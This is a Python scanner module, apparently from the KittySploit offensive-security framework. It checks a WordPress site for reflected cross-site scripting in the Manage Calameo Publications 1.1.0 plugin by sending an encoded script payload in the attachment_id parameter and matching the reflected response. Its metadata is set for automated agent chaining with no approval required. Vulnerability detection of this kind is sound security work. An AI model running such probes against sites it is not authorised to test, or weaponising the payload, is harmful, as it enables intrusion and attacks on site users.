#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Manage Calameo Publications 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via thickbox_content.php and the attachment_id parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'xss', 'wp', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/wp-plugin-athlon-manage-calameo-publications-a3-cross-site-scripting-xss/',
            'https://wpscan.com/vulnerability/83343eb3-bb4c-4b82-adf6-745882f872cc',
            'https://wordpress.org/plugins/athlon-manage-calameo-publications/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('ath_upload_calameo_publication(id\\"><script>alert(document.domain)</script>&)',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting detected",
                path='/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26',
            )
            return True
        return False

